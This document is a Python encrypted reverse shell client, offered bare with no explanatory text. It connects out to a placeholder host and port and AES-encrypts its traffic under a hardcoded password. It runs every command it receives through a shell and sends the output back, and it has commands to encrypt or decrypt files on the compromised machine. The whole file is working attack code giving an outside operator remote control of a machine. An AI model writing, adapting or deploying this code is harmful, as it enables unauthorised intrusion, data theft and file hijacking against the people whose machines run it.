import subprocess,socket,os
import pyAesCrypt
import sys
import io


HOST = 'x.x.x.x'
PORT = xxxx

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

bufferSize = 1024000
password = 'tonona'

def encryptData(msg):
    pbdata = str.encode(msg)
    fIn = io.BytesIO(pbdata)
    fCiph = io.BytesIO(pbdata)
    fCiph = io.BytesIO()
    pyAesCrypt.encryptStream(fIn, fCiph, password, bufferSize)
    dataToSend = fCiph.getvalue()
    return dataToSend


def decryptData(msg):
    fCiph = io.BytesIO()
    fDec = io.BytesIO()
    fCiph = io.BytesIO(msg)
    ctlen = len(fCiph.getvalue())
    fCiph.seek(0)
    pyAesCrypt.decryptStream(fCiph, fDec, password, bufferSize, ctlen)
    decrypted = str(fDec.getvalue().decode('ascii'))
    return decrypted
def sendData(sock,data):
    sock.sendall(encryptData(data))
    sock.sendall(encryptData('EOFX'))
# Decrypt file
def decryptFile(password, file):
    if len(file) < 1 or len(password) < 1 or not os.path.isfile(file): return '> Enter correct file/password.\n'
    try:
        newfile = os.path.splitext(file)[0]
    except: newfile = 'decrypted.' + file
    bufferSize = 64 * 1024
    try:
        pyAesCrypt.decryptFile(file, newfile, password, bufferSize)
        return '> Decrypted: ' + newfile + '\n'
    except:
        return '> Error while decrypting, try again.\n'

# Encrypt file
def encryptFile(password, file):
    if len(file) < 1 or len(password) < 1 or not os.path.isfile(file): return '> Enter correct file/password.\n'
    newfile = file + '.aes'
    bufferSize = 64 * 1024
    try:
        pyAesCrypt.encryptFile(file, newfile, password, bufferSize)
        return '> Encrypted: ' + newfile + '\n'
    except:
        return '> Error while encrypting, try again.\n'
s.sendall(encryptData('let s start\n'))
s.sendall(encryptData('EOFX'))   
while 1:
    data = s.recv(1024000)
    decrypted = decryptData(data)
    if decrypted == "quit":
        print('\nQuitting...')
        break
    elif decrypted[:2] == "cd":
        try: os.chdir(decrypted[3:])
        except: pass
        s.sendall(encryptData('EOFX'))
    elif decrypted[:12] == "encryptfile " or decrypted[:12] == "decryptfile ":
        try:
            args= dict(e.split('=') for e in decrypted[12:].split(', '))
            if len (args['pass']) and len(args['file']): pass
            else: args= 0
        except:
            args=0
            sendData('>Error invalid arguments')
        if args:
            if decrypted[:12] == "encryptfile ": sendData(s, encryptFile(args['pass'], args['file']))
            if decrypted[:12] == "decryptfile ": sendData(s, decryptFile(args['pass'], args['file']))    
    else:
        proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdoutput = proc.stdout.read() + proc.stderr.read()
        sendmsg = str(stdoutput.decode("utf-8", "replace"))
        sendData(s,sendmsg)
# Loop ends here
s.close()
